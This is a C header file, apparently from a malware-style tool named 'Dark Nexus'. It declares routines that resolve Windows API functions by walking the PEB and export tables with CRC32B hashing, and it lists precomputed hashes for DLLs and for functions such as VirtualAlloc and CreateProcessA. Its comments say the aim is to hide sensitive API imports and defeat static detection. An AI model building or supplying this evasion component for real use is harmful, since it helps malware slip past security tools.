#ifndef DN_API_RESOLVE_H
#define DN_API_RESOLVE_H

#include <windows.h>

/*
 * Dark Nexus - API Resolution via PEB Walking + CRC32B Hashing
 *
 * Resolves DLL bases and function addresses without using
 * GetModuleHandle or GetProcAddress, eliminating IAT entries
 * for sensitive APIs.
 *
 * Uses CRC32B hashing for both DLL and function name resolution
 * to defeat string-based static detection.
 */

// CRC32B hash a string (case-insensitive for DLL names)
DWORD dn_crc32b(const char* str);
DWORD dn_crc32b_wide_lower(const wchar_t* str);

// Get DLL base address by CRC32B hash of its name
// Walks PEB -> Ldr -> InLoadOrderModuleList
PVOID dn_get_module_by_hash(DWORD module_hash);

// Get function address by CRC32B hash of its name
// Walks the PE export table of the target module
// Handles forwarded exports (recursive resolution)
PVOID dn_get_proc_by_hash(PVOID module_base, DWORD func_hash);

// Combined: resolve a function from a module, both by hash
PVOID dn_resolve(DWORD module_hash, DWORD func_hash);

// -------------------------------------------------------------------
// Pre-computed CRC32B hashes for commonly needed DLLs and functions
// -------------------------------------------------------------------

// DLL hashes (wide, lowercased)
#define HASH_KERNEL32_DLL       0x6ddb9555
#define HASH_NTDLL_DLL          0x585d5f4e
#define HASH_ADVAPI32_DLL       0xc8fb3dc7
#define HASH_USER32_DLL         0x81e3778e
#define HASH_WINHTTP_DLL        0xa160d1a3
#define HASH_BCRYPT_DLL         0xc83f1472
#define HASH_IPHLPAPI_DLL       0x3bde55e3
#define HASH_WS2_32_DLL         0x6366d1e4

// kernel32 function hashes
#define HASH_LoadLibraryA       0xb7072fdb
#define HASH_GetProcAddress     0xdecfc1bf
#define HASH_VirtualAlloc       0x97bc8b44
#define HASH_VirtualFree        0x2b076940
#define HASH_VirtualProtect     0x10066f2f
#define HASH_CreateProcessA     0x863fcc79
#define HASH_CreateFileA        0x4fdaf6da
#define HASH_ReadFile           0x84d15681
#define HASH_WriteFile          0xe80a791f
#define HASH_CloseHandle        0x0ffd97fb
#define HASH_GetModuleHandleA   0x5fbff0fb
#define HASH_Sleep              0xdb2b5d7b

#endif // DN_API_RESOLVE_H
